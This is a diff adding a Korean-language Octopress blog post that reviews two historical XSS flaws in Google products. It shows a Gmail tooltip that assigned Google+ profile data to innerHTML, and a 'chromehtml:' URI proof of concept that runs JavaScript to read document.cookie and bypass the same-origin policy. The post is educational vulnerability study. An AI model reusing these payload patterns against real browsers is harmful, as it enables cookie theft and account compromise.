@@ -1,0 +1,245 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Gmail XSS - 2012 - My Octopress Blog</title>
+  <meta name="author" content="Your Name">
+
+  
+  <meta name="description" content="Google 프로덕트에서 발견된 대표적인 XSS 취약점들을 리뷰해본다. Google Mail Hacking - Gmail Stored XSS - 2012! // This Gmail Code was creating a Tool-tip that included // &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://yoursite.com/blog/2014/04/23/gmail-xss-2012/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="My Octopress Blog" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">My Octopress Blog</a></h1>
+  
+    <h2>A blogging framework for hackers.</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="yoursite.com">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Gmail XSS - 2012</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-04-23T09:29:16+09:00'><span class='date'><span class='date-month'>Apr</span> <span class='date-day'>23</span><span class='date-suffix'>rd</span>, <span class='date-year'>2014</span></span> <span class='time'>9:29 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>Google 프로덕트에서 발견된 대표적인 XSS 취약점들을 리뷰해본다.</p>
+
+<h3><a href="http://www.benhayak.com/2012/06/google-mail-hacking-gmail-stored-xss.html">Google Mail Hacking - Gmail Stored XSS - 2012!</a></h3>
+
+<pre><code>// This Gmail Code was creating a Tool-tip that included 
+// profile circles information that comes from 
+// your Google Plus friend's account, 
+// if they used a payload, 
+// your mail account would have been at a serious risk.
+
+zk.prototype.Ca = function $pn(a,c,d) {
+    this.xa = 0;
+    if (!this.ea) {
+        // ...
+        var e = this.Bb.zb().body, g = this.ea.va();
+        // ...
+        e.wa = h
+    }
+    a: {
+        if (d)
+            switch (d.toLowerCase().split(",")[1]) {
+                case "l":
+                    break a;
+                case "r":
+                    // ...
+                    break a
+            }
+        e = 2;
+    }
+    this.wa.setPosition(cka(d),e,i,-1);
+    jc(this.ea.va(), "T-ays-avH");
+    ud(this.ea.va(), 0, 0);
+    this.ea.Mc().innerHTML = c; // c = Data from Google+
+    this.wa.To(a);
+    this.wa.Me(k, 0);
+};
+</code></pre>
+
+<p>정리하면 위 코드는 Google+ 친구의 프로파일 정보를 Tool-tip 의 innerHTML 에 장착한다. 결국 친구 프로파일을 보여주는 Tool-tip 이 뜨는 순간, 내 브라우저에 payload 가 실행될 수 있다는 것.</p>
+
+<h3><a href="http://blog.watchfire.com/files/google-chrome-advisory.doc">&ldquo;CHROMEHTML&rdquo; URI Vulnerability</a></h3>
+
+<pre><code>var sneaky = 'setTimeout("alert(document.cookie);", 4000);document.location.assign("http://www.gmail.com");';
+document.location = 'chromehtml:"80%20javascript:document.write(sneaky)"';
+</code></pre>
+
+<p>chromehtml: uri handler 를 통해서 javascript 을 수행시키고, setTimeout() 을 통해 SOP 를 바이패스한다.</p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Your Name</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2014-04-23T09:29:16+09:00'><span class='date'><span class='date-month'>Apr</span> <span class='date-day'>23</span><span class='date-suffix'>rd</span>, <span class='date-year'>2014</span></span> <span class='time'>9:29 am</span></time>
+      
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://yoursite.com/blog/2014/04/23/gmail-xss-2012/" data-via="" data-counturl="http://yoursite.com/blog/2014/04/23/gmail-xss-2012/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2014/04/18/android-code-injection/" title="Previous Post: Android: Code Injection">&laquo; Android: Code Injection</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2014/04/23/bypassing-browser-memory-protections/" title="Next Post: Bypassing Browser Memory Protections">Bypassing Browser Memory Protections &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2015/10/04/return-oriented-programming-for-the-arm-architecture/">Return Oriented Programming for the ARM Architecture</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/10/02/the-inside-story-behind-ms08-067/">The Inside Story Behind MS08-067</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/17/rop-and-arm/">ROP and ARM</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/13/sophail-applied-attacks-against-sophos-antivirus/">Sophail: Applied Attacks Against Sophos Antivirus</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/13/stagefright/">Stagefright</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2015 - Your Name -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
